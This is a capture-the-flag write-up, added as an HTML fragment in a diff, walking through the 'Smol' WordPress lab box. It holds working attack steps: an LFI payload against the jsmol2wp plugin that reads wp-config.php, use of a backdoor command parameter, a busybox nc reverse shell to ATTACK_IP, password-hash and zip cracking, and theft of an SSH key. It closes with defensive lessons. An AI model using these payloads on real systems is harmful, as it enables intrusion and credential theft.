@@ -1,0 +1,72 @@
+<!--
+  writeups/smol.html - content fragment (loaded into the modal)
+  New writeup? Copy writeups/template.html -> writeups/<slug>.html.
+-->
+<h2>Smol — WordPress Plugin SSRF to sudo Bash</h2>
+<p>A WordPress site with a legacy plugin full of CVEs, a poisoned Hello-Dolly backdoor, and a chain of password reuse that ends at a full-sudo user. Goal: user + root flags.</p>
+
+<h3>1 · Enumeration</h3>
+<pre><code><span class="tok-comment"># The site redirects to a subdomain</span>
+<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x smol.thm www.smol.thm</span>" &gt;&gt; /etc/hosts
+
+<span class="tok-func">nmap</span> -sC -sV www.smol.thm
+22/tcp open  ssh   OpenSSH 8.2p1
+80/tcp open  http  Apache 2.4.41 (WordPress 6)
+
+<span class="tok-func">wpscan</span> --url http://www.smol.thm --enumerate u,vp
+<span class="tok-comment"># users: admin think wp diego gege xavi</span>
+<span class="tok-comment"># plugin jsmol2wp 1.07 → CVE-2018-20462 XSS, CVE-2018-20463 SSRF/LFI</span></code></pre>
+
+<h3>2 · LFI Through the Plugin</h3>
+<p>jsmol2wp's <code>query</code> param reads files via <code>php://filter</code>. Grab <code>wp-config.php</code> to win the web + DB credentials.</p>
+<pre><code><span class="tok-func">curl</span> "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/resource=../../../../wp-config.php"
+<span class="tok-comment"># &gt; wp-admin login / DB creds:  wpuser : kbLSF2Vop#lw3rjDZ629*Z%G</span></code></pre>
+
+<h3>3 · Backdoored Hello Dolly</h3>
+<p>A private post says to verify the "Hello Dolly" plugin source — this site's copy was tampered with. Read it through the LFI and decode to find a hidden <code>cmd</code> parameter backdoor. Result: unauthenticated RCE.</p>
+<pre><code><span class="tok-comment"># base64-encode read so PHP doesn't execute the file</span>
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&amp;call=getRawDataFromDatabase&amp;query=php://filter/convert.base64-encode/resource=../hello.php
+
+<span class="tok-comment"># decode → backdoor exposes a "cmd" parameter</span>
+http://www.smol.thm/wp-admin/index.php?cmd=<span class="tok-func">id</span>
+<span class="tok-comment"># &gt; uid=33(www-data) — RCE confirmed</span></code></pre>
+
+<h3>4 · Reverse Shell + DB Dump</h3>
+<pre><code><span class="tok-comment"># busybox nc keeps the payload short</span>
+http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%20ATTACK_IP%20443%20-e%20sh
+<span class="tok-func">nc</span> -lvnp <span class="tok-num">443</span>
+<span class="tok-comment"># &gt; shell as www-data</span>
+
+<span class="tok-comment"># Reuse DB creds → dump wp_users → john + rockyou</span>
+<span class="tok-func">mysql</span> -u wpuser -p... wordpress -e <span class="tok-string">"SELECT user_login,user_pass FROM wp_users"</span>
+<span class="tok-func">john</span> hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+<span class="tok-comment"># &gt; diego : &lt;cracked&gt; — the @local account</span>
+<span class="tok-func">su</span> diego
+<span class="tok-func">find</span> / -name <span class="tok-string">'user.txt'</span>
+<span class="tok-comment"># &gt; user flag</span></code></pre>
+
+<h3>5 · diego → think (stolen SSH key)</h3>
+<p>Keep enumerating — another user's private key is world-readable. Grab <code>think</code>'s <code>id_rsa</code> and SSH in; think belongs to the <code>dev</code> and <code>internal</code> groups.</p>
+<pre><code><span class="tok-func">cat</span> /home/think/.ssh/id_rsa
+<span class="tok-func">chmod</span> <span class="tok-num">600</span> id_rsa
+<span class="tok-func">ssh</span> -i id_rsa think@smol.thm
+<span class="tok-comment"># think → groups: think, dev, internal</span></code></pre>
+
+<h3>6 · think → xavi (old zip + wp-config)</h3>
+<p>think's home contains <code>wordpress.old.zip</code>, password-protected. Crack it, unzip, and read the old <code>wp-config.php</code> — it leaks xavi's credentials.</p>
+<pre><code><span class="tok-func">zip2john</span> wordpress.old.zip &gt; zip.hash
+<span class="tok-func">john</span> zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+<span class="tok-func">unzip</span> wordpress.old.zip
+<span class="tok-func">cat</span> wordpress.old/wp-config.php
+<span class="tok-comment"># &gt; xavi's password in the DB constants</span>
+<span class="tok-func">su</span> xavi</code></pre>
+
+<h3>7 · xavi → root</h3>
+<pre><code><span class="tok-func">sudo</span> -l
+(user xavi) (ALL : ALL) ALL
+<span class="tok-func">sudo</span> su
+root@smol:~# <span class="tok-func">cat</span> /root/root.txt
+<span class="tok-comment"># root flag</span></code></pre>
+
+<h3>8 · Retrospective</h3>
+<p>Attack chain: plugin LFI → wp-config creds → poisoned-plugin RCE → hash crack → SSH key theft → old-zip cred leak → full sudo. Lessons: drop stale plugins, review third-party code, and DB/SSH/zip password reuse makes the box one long sudo.</p>
